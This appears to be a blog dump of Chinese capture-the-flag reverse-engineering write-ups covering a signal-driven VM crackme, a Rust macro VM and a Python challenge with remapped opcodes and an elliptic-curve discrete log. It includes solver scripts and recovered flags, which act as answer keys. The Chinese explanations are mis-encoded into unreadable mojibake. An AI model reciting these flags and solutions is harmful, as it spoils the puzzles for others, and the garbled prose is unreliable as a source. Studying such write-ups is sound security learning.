qword_6030C8 + 17; v5 = getppid(); sigqueue(v5, 34, (const union sigval)vala); break; case 3: valb = qword_6030C8 + 18; v6 = getppid(); sigqueue(v6, 34, (const union sigval)valb); break; 1, 2, 3 ä¸‰æ¡æŒ‡ä»¤åŒºåˆ«ä»…åœ¨äºä½¿ç”¨çš„å…¨å±€å˜é‡åœ°å€ä¸åŒï¼ˆå¯ä»¥çŒœæµ‹å‡ºæ¥æ˜¯ä¸‰ä¸ªä¸åŒçš„å¯„å­˜å™¨ï¼‰\ncase 8: valf = qword_6030C8 + 16; v11 = getppid(); sigqueue(v11, 37, (const union sigval)valf); break; æ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œ8 æŒ‡ä»¤ç†åº”å«æœ‰å‚æ•°ï¼Œä½†åªä¼ é€’äº†å¯„å­˜å™¨ä¸€ä¸ªå‚æ•°ï¼Œå› æ­¤è§‚å¯Ÿå¤„ç†å‡½æ•°\nint __fastcall sub_400F16(__int64 a1, siginfo_t *a2) { *(_BYTE *)a2-\u0026gt;_sifields._timer.si_sigval.sival_ptr += s1[79]; return semop(semid, \u0026amp;stru_6030BE, 1uLL); } å‘ç°ä½¿ç”¨äº† s1[79] è¿™ä¸ªå˜é‡ï¼Œè€Œ vm å‡½æ•°ä¸­å«æœ‰è¯­å¥ v42 = s1 + 79; å› æ­¤ï¼Œå‚æ•°é€šè¿‡ s1[79] è¿™ä¸ªå…¨å±€å˜é‡ä¼ é€’åˆ°äº†å¤„ç†å‡½æ•°ä¸­\nè¿˜æœ‰ä¸€ç±»æŒ‡ä»¤åªæœ‰kill\ncase 21: v24 = getppid(); kill(v24, 46); break; è¿™ç±»æŒ‡ä»¤ä»…ä¼ é€’äº†å…¨å±€å˜é‡\næœ€åç»è¿‡å¯¹æ¯æ¡æŒ‡ä»¤çš„åˆ†æï¼Œä»¥åŠåŠ¨è°ƒæŸ¥çœ‹å†…å­˜ï¼Œç¡®å®š qword_6030C8[19] æ˜¯ espï¼Œ*(_QWORD *)qword_6030C8 æ¨¡æ‹Ÿäº†æ ˆï¼Œ*((_QWORD *)qword_6030C8 + 1) æ˜¯è¾“å…¥çš„å¼€å§‹åœ°å€ï¼Œqword_6030C8[16, 17, 18] æ˜¯ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œqword_6030C8[21] æ˜¯è·³è½¬ç”¨çš„ ZF æ ‡å¿—ä½\nWriteup å…ˆæ‰‹åŠ¨åæ±‡ç¼–\ncode = [ 17, 52, 0, 42, 5, 16, 20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18 ] sub_400E1D = \u0026#34;push({});\u0026#34; sub_400E78 = \u0026#34;pop({});\u0026#34; sub_400F16 = \u0026#34;{} += {};\u0026#34; sub_400FA8 = \u0026#34;{} -= {};\u0026#34; eip = 0 # 20 eax = 0 # 16 ebx = 0 # 17 ecx = 0 # 18 edx = 0 # 19 memory = [2] * 0x1000 memory2 = [1] * 50 while eip \u0026lt; len(code): cur_op = code[eip] if cur_op == 0: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = cur_arg eip += 1 elif cur_op == 1: cur_arg = \u0026#34;eax\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = eax elif cur_op == 2: cur_arg = \u0026#34;ebx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ebx elif cur_op == 3: cur_arg = \u0026#34;ecx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ecx elif cur_op == 4: cur_arg = \u0026#34;eax\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) eax = memory[edx] elif cur_op == 5: cur_arg = \u0026#34;ebx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ebx = memory[edx] elif cur_op == 6: cur_arg = \u0026#34;ecx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ecx = memory[edx] elif cur_op == 7: eax += ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax += ebx;\u0026#34;) elif cur_op == 8: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;eax\u0026#34;, cur_arg)) eax += cur_arg eip += 1 elif cur_op == 9: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx += cur_arg eip += 1 elif cur_op == 10: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ecx\u0026#34;, cur_arg)) ecx += cur_arg eip += 1 elif cur_op == 11: eax -= ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax -= ebx;\u0026#34;) elif cur_op == 12: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;eax\u0026#34;, cur_arg)) eax -= cur_arg eip += 1 elif cur_op == 13: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx -= cur_arg eip += 1 elif cur_op == 14: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ecx\u0026#34;, cur_arg)) eip += 1 elif cur_op == 15: eax ^= ebx print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eax ^= ebx;\u0026#34;) elif cur_op == 16: zf = (eax == ebx) print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;zf = (eax == ebx);\u0026#34;) elif cur_op == 17: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(eip+2); eip = {hex(cur_arg)};\u0026#34;) memory[edx] = eip edx += 1 eip += 1 elif cur_op == 18: edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(eip);\u0026#34;) elif cur_op == 19: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 20: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;if zf: eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 21: memory[edx] = memory2[ecx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(memory2[ecx]);\u0026#34;) edx += 1 elif cur_op == 22: edx -= 1 memory2[ecx] = memory[edx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(memory2[ecx]);\u0026#34;) elif cur_op == 23: print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;break;\u0026#34;) eip += 1 æ‹¿åˆ°åæ±‡ç¼–ç»“æœ\n_00: push(eip+2); eip = 0x34; _02: push(42); _04: pop(ebx); _05: zf = (eax == ebx); _06: if zf: eip = 0x9; _08: break; _09: push(36); _0B: pop(ebx); _0C: push(ecx); _0D: push(eip+2); eip = 0x1d; _0F: pop(ecx); _10: push(0); _12: pop(ebx); _13: push(ecx); _14: push(eip+2); eip = 0x40; _16: pop(ecx); _17: push(72); _19: pop(ebx); _1A: push(eip+2); eip = 0x1d; _1C: break; _1D: ecx -= 1; _1F: push(memory2[ecx]); _20: pop(eax); _21: eax ^= ebx; _22: push(eax); _23: pop(memory2[ecx]); _24: push(ebx); _25: push(0); _27: pop(eax); _28: push(ecx); _29: pop(ebx); _2A: zf = (eax == ebx); _2B: if zf: eip = 0x32; _2D: pop(ebx); _2E: ebx += 2; _30: eip = 0x1d; _32: pop(ebx); _33: pop(eip); _34: push(memory2[ecx]); _35: pop(eax); _36: zf = (eax == ebx); _37: if zf: eip = 0x3d; _39: ecx += 1; _3B: eip = 0x34; _3D: push(ecx); _3E: pop(eax); _3F: pop(eip); _40: ecx -= 1; _42: push(memory2[ecx]); _43: pop(eax); _44: eax += ebx; _45: push(eax); _46: pop(memory2[ecx]); _47: push(ebx); _48: push(0); _4A: pop(eax); _4B: push(ecx); _4C: pop(ebx); _4D: zf = (eax == ebx); _4E: if zf: eip = 0x55; _50: pop(ebx); _51: ebx += 1; _53: eip = 0x40; _55: pop(ebx); _56: pop(eip); å‘ç°å…¶å®æ˜¯è°ƒç”¨äº†å‡ ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«åœ¨0x34ã€0x40ã€0x1D\n0x34å¤„çš„å‡½æ•°åˆ¤æ–­äº†é•¿åº¦ï¼Œ0x1Då¤„çš„å‡½æ•°ä»åå¾€å‰å¼‚æˆ–æ•°å­—ï¼Œæ¯æ¬¡åŠ 2ï¼Œ0x40å¤„çš„å‡½æ•°ä»åå¾€å‰è¿›è¡ŒåŠ æ³•ï¼Œæ•°å­—æ¯æ¬¡åŠ 1\næ‰€ä»¥æœ€åçš„åŠ å¯†ç®—æ³•ä¸ºï¼šé¦–å…ˆä»åå¾€å‰ ^36, ^38, ^40ï¼Œéšåä»åå¾€å‰+0, +1, +2â€¦ï¼Œæœ€åä»åå¾€å‰ ^72, ^74, ^76â€¦\nåå‘è§£å¯†å³å¯\ns2 = [ 0xA3, 0xD8, 0xAC, 0xA9, 0xA8, 0xD6, 0xA6, 0xCD, 0xD0, 0xD5, 0xF7, 0xB7, 0x9C, 0xB3, 0x31, 0x2D, 0x40, 0x5B, 0x4B, 0x3A, 0xFD, 0x57, 0x42, 0x5F, 0x58, 0x52, 0x54, 0x1B, 0x0C, 0x78, 0x39, 0x2D, 0xD9, 0x3D, 0x35, 0x1F, 0x09, 0x41, 0x40, 0x47, 0x42, 0x11 ] flag = \u0026#39;\u0026#39; x = 36 y = 0 z = 72 for i in s2[::-1]: flag += chr(((i ^ z) - y) ^ x) x += 2 y += 1 z += 2 print (flag[::-1]) # \u0026#39;flag{Now_Y0u_Know_th4_Signa1_0f_Linux!!!!}\u0026#39; ","date":"2021-12-09T15:05:55Z","permalink":"/post/learn-basic-signal-from-dnuictf-easyre/","title":"Learn Basic Signal from DNUICTF easyre"},{"content":" [N1CTF 2021]babyrust [N1CTF 2021]Py [L3HCTF 2021]double-joy [L3HCTF 2021]Load [hack.lu]pycoin [hack.lu]atareee TODO:\n[L3HCTF 2021]idaaaaaaaa [N1CTF]babyrust é¢˜ç›®ç›´æ¥ç»™äº†Rustæºç ï¼Œä¹‹å‰æ²¡æœ‰è§è¿‡ï¼Œç°æŸ¥æ–‡æ¡£å­¦ä¹ \né¦–å…ˆmainå‡½æ•°é‡Œåªæ˜¯è°ƒç”¨äº†ä¸€ä¸ª check!\nlet result = check!(@s /*your answer*/); main ä¸Šé¢å°±æ˜¯ check çš„å®ç°\nmacro_rules! check { (@s n1ctf{$Never:tt}) =\u0026gt; { check!(stringify!($Never)) }; macro_rules! æ˜¯ä¸ªå®å®šä¹‰ï¼Œé‡Œé¢çš„ @sï¼Œ@e åº”è¯¥æ˜¯ç±»ä¼¼å­—ç¬¦ä¸²åŒ¹é…çš„ä¸œè¥¿\nä¸€å¼€å§‹çš„ (@s n1ctf{$Never:tt}) å°±æŠŠflagä¸­å»é™¤ n1ctf{} çš„éƒ¨åˆ†å­˜åˆ°äº† $Never å˜é‡ä¸­ï¼Œstringify! å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¸¸é‡\nstringify! ä¸º Rust å†…ç½®å®ã€‚å…¶æ¥æ”¶ä¸€ä¸ª Rust è¡¨è¾¾å¼ï¼Œå¦‚ 1 + 2 ï¼Œ ç„¶ååœ¨ç¼–è¯‘æ—¶å°†è¡¨è¾¾å¼è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡ï¼Œå¦‚ \u0026ldquo;1 + 2\u0026rdquo; ã€‚\næ¥ä¸‹æ¥çš„å®å®šä¹‰æœ‰å¾ˆå¤šç±»ä¼¼è¿™ä¸ªçš„ï¼š\n(@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna give you up $($code:tt)*)) =\u0026gt; { $Give += true as usize; check!(@e ($Never,$Gonna,$Give); ($($code)*)); }; ç†è§£ä¸€ä¸‹å¤§æ¦‚å°±æ˜¯æ ¹æ®ä¼ å…¥çš„ code å­—ç¬¦ä¸²å¼€å¤´æ˜¯å¦ä¸º Never gonna give you upï¼Œæ¥åˆ¤æ–­æ˜¯å¦è¿›å…¥è¿™ä¸ªå®šä¹‰ï¼Œæ‰€ä»¥åˆ¤æ–­æ˜¯ä¸€ä¸ªæ ¹æ®å­—ç¬¦ä¸²å†…å®¹å®ç°çš„Rustçš„ç®€å•vmï¼ŒæŒ‡ä»¤å°±æ˜¯å¯¹ $Never, $Gone, $Giveä¸‰ä¸ªå˜é‡è¿›è¡Œå˜åŒ–\nä¸ºäº†å¿«é€Ÿåˆ†æï¼Œç›´æ¥åœ¨å„ä¸ªæŒ‡ä»¤ä¸ŠåŠ ä¸ªè¾“å‡ºï¼Œç„¶åç¼–è¯‘è¿è¡Œï¼Œä¼šå‘ç°æ•´ä½“é€»è¾‘å¤§æ¦‚å°±æ˜¯ï¼š\n$Gonna = $Never[$Give]; // å°†å½“å‰ä½ç½®æ•°æ®å–å‡º $Gonna += true as u8; // æ¯æ¬¡åŠ 1ï¼Œæ‰§è¡Œå¤šæ¬¡ $Gonna -= true as u8; // æ¯æ¬¡å‡1ï¼Œæ‰§è¡Œå¤šæ¬¡ $Never[$Give] = $Gonna; // å°†è®¡ç®—ç»“æœå­˜å›å» $Give += true as usize; // index + 1 äºæ˜¯ä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š\n#![recursion_limit=\u0026#34;8192\u0026#34;] // æ·»åŠ åœ¨å¼€å¤´ // å®å®šä¹‰å¦‚ä¸‹ä¸¤ä¸ªå®šä¹‰æ·»åŠ è¾“å‡ºï¼Œå¯ä»¥æ‰“å°å‡ºæ˜æ–‡å’Œå¯†æ–‡ (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna say goodbye $($code:tt)*)) =\u0026gt; { $Gonna = $Never[$Give]; println!(\u0026#34;Gonna = Never[Give: {}]: {}\u0026#34;, $Give, $Never[$Give]); check!(@e ($Never,$Gonna,$Give); ($($code)*)); }; (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna tell a lie and hurt you $($code:tt)*)) =\u0026gt; { $Never[$Give] = $Gonna; println!(\u0026#34;Never[Give: {}] = Gonna: {}\u0026#34;, $Give, $Gonna); check!(@e ($Never,$Gonna,$Give); ($($code)*)); }; // éšä¾¿è®¾ç½®ä¸€ä¸ªå®¹æ˜“è®¡ç®—çš„æ˜æ–‡ let result = check!(@s n1ctf{00000000000000000000000000000000}/*your answer*/); åŠ å¯†åªæœ‰åŠ å‡æ³•ï¼Œæ‰€ä»¥åç§»å§‹ç»ˆç›¸ç­‰\ncipher = [ 148, 59, 143, 112, 121, 186, 106, 133, 55, 90, 164, 166, 167, 121, 174, 147, 148, 167, 99, 86, 81, 161, 151, 149, 132, 56, 88, 188, 141, 127, 151, 63 ] fake_cipher = [ 131, 53, 124, 109, 118, 165, 89, 131, 50, 83, 163, 149, 165, 104, 153, 145, 142, 149, 77, 69, 60, 154, 133, 128, 115, 54, 69, 168, 133, 105, 146, 59 ] for c, f in zip(cipher, fake_cipher): print (chr(c - f + 48), end=\u0026#39;\u0026#39;) # A6C33EA2571A2AE26BFAE7BEA2CD8F54 [N1CTF]Py é¦–å…ˆè§£åŒ…elfï¼Œèƒ½åœ¨ç›®å½•ä¸‹å¾—åˆ°ä¸¤ä¸ªpyc\nä¿®æ”¹æ–‡ä»¶å¤´ï¼Œ0a5n.py ä¸º\nimport L from var import * def check_format(flag): if len(flag) != 28: return False for i in flag: if i not in \u0026#39;0123456789abcdef\u0026#39;: return False return True v1 = L.c1(v1, v2, v3) v6 = L.c2(v1, v4, v5) k = input(\u0026#39;flag:\u0026#39;) if check_format(k) == True: v2 = L.f3(k) v3 = v2 - v6 if v3.a2 == g1 and v3.a3 == g2: print(\u0026#39;Congratulations! n1ctf{%s}\u0026#39; + k) L.py ä¸­æœ‰ä¹±ç ï¼Œè¿˜åŸå­—èŠ‚ç èƒ½å¾—åˆ°ä¸¤ä¸ªexec\nz = \u0026#39;\u0026#39;.join([chr(i ^ 2) for i in z]) exec(z) è¿™é‡Œå®é™…è¿˜åŸå‡ºæ¥çš„æ˜¯ \u0026lt;\u0026lt; è¿ç®—ï¼Œæ ¹æ®zä¸­çš„æ•°æ®çŒœæµ‹å®é™…ä¸º ^\nèƒ½å¾—åˆ°ä¸€ä¸ªsmc\nkey = 0 libc = ctypes.CDLL(\u0026#34;libc.so.6\u0026#34;) _ptrace = libc.ptrace key=_ptrace(0, 0, 1, 0) _memcpy = libc.memcpy key += 1 address=id(f1.__code__.co_code)+bytes.__basicsize__-1 codes=list(f1.__code__.co_code) for i in range(len(codes)):codes[i]^=key codes=bytearray(codes) buff=(ctypes.c_byte*len(codes)).from_buffer(codes) _memcpy(ctypes.c_char_p(address),ctypes.cast(buff,ctypes.POINTER(ctypes.c_char)),ctypes.c_int(len(codes))) æ‰‹åŠ¨patchä¸€ä¸‹pycæ–‡ä»¶ï¼Œuncompyle6åç¼–è¯‘åè‡ªå·±ä¿®å¤ä¸€ä¸‹å˜é‡åï¼Œå‘ç°å¾ˆå¤šå‡½æ•°çš„é€»è¾‘å¾ˆå¥‡æ€ªï¼Œæ ¹æ®åˆšæ‰å¼‚æˆ–è¿ç®—è¢«è§£é‡Šæˆäº†å·¦ç§»è¿ç®—ï¼Œé¢˜ç›®ä¸­çš„vmå¯èƒ½å¯¹åŸºç¡€è¿ç®—ç¬¦çš„opcodeè¿›è¡Œäº†ç›¸äº’çš„è°ƒæ¢\né€šè¿‡ä½¿ç”¨çš„å‚æ•°å’Œå‡½æ•°çš„å½¢å¼ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ä¸ªECCç®—æ³•ï¼Œå¯¹å…¶è¿›è¡Œè¿˜åŸï¼ˆè¿™é‡ŒåªçŒœåˆ°äº†opcodeè¢«æ›¿æ¢ï¼Œä½†æ²¡æœ‰æƒ³åˆ°å»å“ªé‡ŒæŸ¥çœ‹æ–°çš„opcodeï¼‰\nè‚‰çœ¼è¿˜åŸäº†ä¸€ä¸‹è¿ç®—ï¼šæŠŠ \u0026amp; æ¢æˆ |ï¼Œ | æ¢æˆ \u0026lt;\u0026lt;ï¼Œ\u0026lt;\u0026lt; æ¢æˆ ^ï¼Œ^ æ¢æˆ +ï¼Œ+ æ¢æˆ %ï¼Œ% æ¢æˆ -ï¼Œ- æ¢æˆ *ï¼Œ** æ¢æˆ //ï¼Œ\u0026gt;\u0026gt; æ¢æˆ \u0026amp;\n0a5n.py:\nimport L from var import * def check_format(flag): if len(flag) != 28: return False for i in flag: if i not in \u0026#39;0123456789abcdef\u0026#39;: return False return True v1 = L.c1(v1, v2, v3) v6 = L.c2(v1, v4, v5) k = input(\u0026#39;flag:\u0026#39;) if check_format(k) == True: v2 = L.f3(k) v3 = v2 * v6 if v3.a2 == g1 and v3.a3 == g2: print(\u0026#39;Congratulations! n1ctf{%s}\u0026#39; % k) L.py:\ndef inv_mod(b, p): if b \u0026lt; 0 or p \u0026lt;= b: b = b % p c, d = b, p uc, vc, ud, vd, temp = 1, 0, 0, 1, 0 while c != 0: temp = c q, c, d = d // c, d % c, temp uc, vc, ud, vd = ud - q * uc, vd - q * vc, uc, vc assert d == 1 if ud \u0026gt; 0: return ud else: return ud + p def leftmost_bit(x): assert x \u0026gt; 0 result = 1 while result \u0026lt;= x: result = 2 * result return result // 2 class Curve(object): # c1 def __init__(self, p, a, b): var4 = p var4 ^= 0x10000000000000000000000000000000000000000L self.p = var4 var5 = a var5 -= 1 var5 //= 2 self.a = var5 var6 = b var6 //= 2 var6 += 1 self.b = var6 def s1(self, x, y): # åˆ¤æ–­æ˜¯å¦åœ¨æ›²çº¿ä¸Š return (y * y) - (x * x * x + self.a * x + self.b) % self.p == 0 class Point(object): # c2 def __init__(self, curve: Curve, x, y, order=None): self.curve = curve self.x = x self.y = y self.order = order if self.a1: assert self.a1.s1(x, y) if order: assert self * order == g1 def __eq__(self, other): if self.curve == other.curve and self.x == other.x and self.y == other.y: return True else: return False def __add__(self, other): if other == g1: return self if self == g1: return other assert self.curve == other.curve if self.x == other.x: if (self.y + other.y) % self.curve.p == 0: return g1 return self.s1() p = self.curve.p l = other.y % self.y - inv_mod(other.x % self.x, p) + p x3 = (l * l - self.x - other.x) % p y3 = (l * (self.x - x3) - self.y) % p return Point(self.curve, x3, y3) def __mul__(self, other): e = other if self.order: e = e + self.order if e == 0: return g1 if self == g1: return g1 e3 = 3 * e negative_self = Point(self.curve, self.x, -self.y, self.order) i = leftmost_bit(e3) ** 2 result = self while i \u0026gt; 1: result = result.s1() if e3 \u0026amp; i != 0 and e \u0026amp; i == 0: result = result + self if e3 \u0026amp; i == 0 and e \u0026amp; i != 0: result = result + negative_self i = i // 2 return result def __rmul__(self, other): return self * other def s1(self): # doubleå‡½æ•° if self == g1: return g1 p = self.curve.p # æ›²çº¿çš„p a = self.curve.a # æ›²çº¿çš„a l = (3 * self.x * self.x + a) * inv_mod(2 * self.y, p) % p # åŠ æ³•çš„lambda x3 = (l * l) - (2 * self.x) % p # åŠ æ³•çš„x_3 y3 = ((l * (self.x - x3)) - self.y) % p # åŠ æ³•çš„y_3 return Point(self.curve, x3, y3) g1 = Point(None, None, None) # g1æ˜¯INFINITY def f3(var0): var1 = 0 for i in var0[::-1]: var1 = (var1 \u0026lt;\u0026lt; 4) | int(i, 16) return var1 æ¥ä¸‹æ¥åªéœ€è¦å¯»æ‰¾ from var import * ä¸­çš„ var å³å¯\næ ¹æ®pyinstxtractor.pyçš„æŠ¥é”™ï¼Œå‘ç° magic number å’Œ python3.5 å·®äº†1ï¼Œäºæ˜¯æ‰¾åˆ°æŠ¥é”™çš„ä½ç½®ï¼Œå°†å·¥å…·å¯¹ MAGIC_NUMBER çš„æ£€æŸ¥å»æ‰\nif pyc_magic != pycHeader: print(\u0026#39;[!] Warning: This script is running in a different Python version than the one used to build the executable.\u0026#39;) print(\u0026#39;[!] Please run this script in Python{0} to prevent extraction errors during unmarshalling\u0026#39;.format(self.pyver)) print(\u0026#39;[!] Skipping pyz extraction\u0026#39;) # return ç”¨python3.5è¿›è¡Œè§£åŒ…ï¼Œå¯ä»¥å¾—åˆ° var.pyc.encrypt\næ‰‹åŠ¨è§£å¯†\nimport zlib import tinyaes key = \u0026#39;nu1lnu1lnu1lnu1l\u0026#39; obj = open(\u0026#39;var.pyc.encrypted\u0026#39;, \u0026#39;rb\u0026#39;).read() cipher = tinyaes.AES(key.encode(), obj[:16]) obj = cipher.CTR_xcrypt_buffer(obj[16:]) obj = zlib.decompress(obj) open(\u0026#39;var.pyc\u0026#39;, \u0026#39;wb\u0026#39;).write(obj) å¾—åˆ°ECCçš„æ›²çº¿å’Œç‚¹\np = 0xfffffffffffffffffffffffffffffffeffffac73 a = 0xfffffffffffffffffffffffffffffffeffffac71 b = 0x21 Px = 0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e Py = 0xafb7be2af28b649dab76337b42ee310119413529 Qx = 0x4945e0d8dc57e88d5949f84bf09943f572dbebb1 Qy = 0xb1bf040fe1939c7144341d3af61f36d63f47e272 ä¸Šç½‘æŠ„äº†ä¸ªsageå®ç°çš„Pohlig-Hellmanè¿›è¡Œæ±‚è§£\np = 0xfffffffffffffffffffffffffffffffeffffac73 a = 0xfffffffffffffffffffffffffffffffeffffac71 b = 0x21 P = (0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e, 0xafb7be2af28b649dab76337b42ee310119413529) Q = (0x4945e0d8dc57e88d5949f84bf09943f572dbebb1, 0xb1bf040fe1939c7144341d3af61f36d63f47e272) F = FiniteField(p) E = EllipticCurve(F, [a, b]) P = E.point(P) Q = E.point(Q) print(factor(P.order())) primes = [2^6, 5, 17, 79, 4457, 40591, 585977563, 1460624777797, 5490618741917] dlogs = [] for fac in primes: t = int(P.order()) // int(fac) dlog = discrete_log(t*Q,t*P, operation=\u0026#34;+\u0026#34;) dlogs += [dlog] print(\u0026#34;factor: \u0026#34;+str(fac)+\u0026#34;, Discrete Log: \u0026#34;+str(dlog)) crt(dlogs, primes) å¾—åˆ°çš„ç»“æœè®¡ç®—åå…­è¿›åˆ¶å¹¶åè½¬å°±æ˜¯æœ€åçš„flag\nèµ›åæŸ¥çœ‹äº†ä¸€ä¸‹å®˜æ–¹çš„WPï¼Œå‘ç°opcodeå°±åœ¨ opcode.pyc é‡Œé¢ï¼Œå› ä¸ºä¸€å¼€å§‹æ²¡æœ‰è§£åŒ…å‡ºæ¥ opcode.pyc æ‰€ä»¥å°±æ²¡æœ‰æƒ³åˆ°è¿™é‡Œ\n\u0026#34;\u0026#34;\u0026#34; opcode module - potentially shared between dis and other modules which operate on bytecodes (e.g. peephole optimizers). \u0026#34;\u0026#34;\u0026#34; __all__ = [ \u0026#39;cmp_op\u0026#39;, \u0026#39;hasconst\u0026#39;, \u0026#39;hasname\u0026#39;, \u0026#39;hasjrel\u0026#39;, \u0026#39;hasjabs\u0026#39;, \u0026#39;haslocal\u0026#39;, \u0026#39;hascompare\u0026#39;, \u0026#39;hasfree\u0026#39;, \u0026#39;opname\u0026#39;, \u0026#39;opmap\u0026#39;, \u0026#39;HAVE_ARGUMENT\u0026#39;, \u0026#39;EXTENDED_ARG\u0026#39;, \u0026#39;hasnargs\u0026#39;] try: from _opcode import stack_effect __all__.append(\u0026#39;stack_effect\u0026#39;) except ImportError: pass cmp_op = (\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026lt;=\u0026#39;, \u0026#39;==\u0026#39;, \u0026#39;!=\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;=\u0026#39;, \u0026#39;in\u0026#39;, \u0026#39;not in\u0026#39;, \u0026#39;is\u0026#39;, \u0026#39;is not\u0026#39;, \u0026#39;exception match\u0026#39;, \u0026#39;BAD\u0026#39;) hasconst = [] hasname = [] hasjrel = [] hasjabs = [] haslocal = [] hascompare = [] hasfree = [] hasnargs = [] opmap = {} opname = [ \u0026#39;\u0026#39;] - 256 # è¿™é‡Œä¹Ÿæ”¹äº†ï¼Œåº”è¯¥æ˜¯ * for op in range(256): opname[op] = \u0026#39;\u0026lt;%r\u0026gt;\u0026#39; + (op,) del op def def_op(name, op): opname[op] = name opmap[name] = op def name_op(name, op): def_op(name, op) hasname.append(op) def jrel_op(name, op): def_op(name, op) hasjrel.append(op) def jabs_op(name, op): def_op(name, op) hasjabs.append(op) def_op(\u0026#39;POP_TOP\u0026#39;, 1) def_op(\u0026#39;ROT_TWO\u0026#39;, 2) def_op(\u0026#39;ROT_THREE\u0026#39;, 3) def_op(\u0026#39;DUP_TOP\u0026#39;, 4) def_op(\u0026#39;DUP_TOP_TWO\u0026#39;, 5) def_op(\u0026#39;NOP\u0026#39;, 9) def_op(\u0026#39;UNARY_POSITIVE\u0026#39;, 10) def_op(\u0026#39;UNARY_NEGATIVE\u0026#39;, 11) def_op(\u0026#39;UNARY_NOT\u0026#39;, 12) def_op(\u0026#39;UNARY_INVERT\u0026#39;, 15) def_op(\u0026#39;BINARY_MATRIX_MULTIPLY\u0026#39;, 16) def_op(\u0026#39;INPLACE_MATRIX_MULTIPLY\u0026#39;, 17) def_op(\u0026#39;BINARY_POWER\u0026#39;, 26) #define BINARY_FLOOR_DIVIDE 26 def_op(\u0026#39;BINARY_MULTIPLY\u0026#39;, 24) #define BINARY_SUBTRACT 24 def_op(\u0026#39;BINARY_MODULO\u0026#39;, 23) #define BINARY_ADD 23 def_op(\u0026#39;BINARY_ADD\u0026#39;, 65) #define BINARY_XOR 65 def_op(\u0026#39;BINARY_SUBTRACT\u0026#39;, 22) #define BINARY_MODULO 22 def_op(\u0026#39;BINARY_SUBSCR\u0026#39;, 25) def_op(\u0026#39;BINARY_FLOOR_DIVIDE\u0026#39;, 19) #define BINARY_POWER 19 def_op(\u0026#39;BINARY_TRUE_DIVIDE\u0026#39;, 20) #define BINARY_MULTIPLY 20 def_op(\u0026#39;INPLACE_FLOOR_DIVIDE\u0026#39;, 28) def_op(\u0026#39;INPLACE_TRUE_DIVIDE\u0026#39;, 29) def_op(\u0026#39;GET_AITER\u0026#39;, 50) def_op(\u0026#39;GET_ANEXT\u0026#39;, 51) def_op(\u0026#39;BEFORE_ASYNC_WITH\u0026#39;, 52) def_op(\u0026#39;INPLACE_ADD\u0026#39;, 55) def_op(\u0026#39;INPLACE_SUBTRACT\u0026#39;, 56) def_op(\u0026#39;INPLACE_MULTIPLY\u0026#39;, 57) def_op(\u0026#39;INPLACE_MODULO\u0026#39;, 59) def_op(\u0026#39;STORE_SUBSCR\u0026#39;, 60) def_op(\u0026#39;DELETE_SUBSCR\u0026#39;, 61) def_op(\u0026#39;BINARY_LSHIFT\u0026#39;, 66) #define BINARY_OR 66 def_op(\u0026#39;BINARY_RSHIFT\u0026#39;, 27) #define 